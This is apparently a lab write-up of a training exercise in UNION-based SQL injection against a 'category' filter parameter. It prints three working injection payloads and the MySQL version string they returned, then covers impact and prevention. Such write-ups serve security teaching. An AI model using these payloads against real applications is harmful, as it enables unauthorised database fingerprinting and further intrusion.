# SQL Injection UNION Attack - Determining the Database Version

## Objective

Use a UNION-based SQL injection attack to retrieve the database version information.

## Vulnerable Parameter

`category`

## Step 1: Determine the Number of Columns

Payload:

```http
GET /filter?category=Gifts' UNION SELECT NULL,NULL# HTTP/2
```

Result:
- Success
- No error returned

Conclusion:
- The original query returns 2 columns.

## Step 2: Verify Text-Compatible Columns

Payload:

```http
GET /filter?category=Gifts' UNION SELECT 'abc','def'# HTTP/2
```

Result:
- Success
- Both values appeared in the response.

Conclusion:
- Both columns accept string data.

## Step 3: Retrieve Database Version

Payload:

```http
GET /filter?category=Gifts' UNION SELECT @@version,NULL# HTTP/2
```

Result:

```text
8.0.42-0ubuntu0.20.04.1
```

## Explanation

The MySQL system variable `@@version` contains the version information of the database server.

By using a UNION-based SQL injection attack, the value of `@@version` was returned in the application's response.

The retrieved version was:

```text
8.0.42-0ubuntu0.20.04.1
```

This indicates that the backend database is MySQL and is running on Ubuntu.

## Security Impact

An attacker could:

- Identify the database technology in use.
- Determine the exact database version.
- Search for version-specific vulnerabilities.
- Gather information useful for further attacks.

## Prevention

- Use parameterized queries (prepared statements).
- Avoid constructing SQL queries through string concatenation.
- Validate and sanitize user input.
- Restrict database error messages and information disclosure.
- Conduct regular security testing.

## Key Concepts Learned

- UNION-based SQL injection
- Database fingerprinting
- Version disclosure
- MySQL system variables
- Information gathering through SQL injection
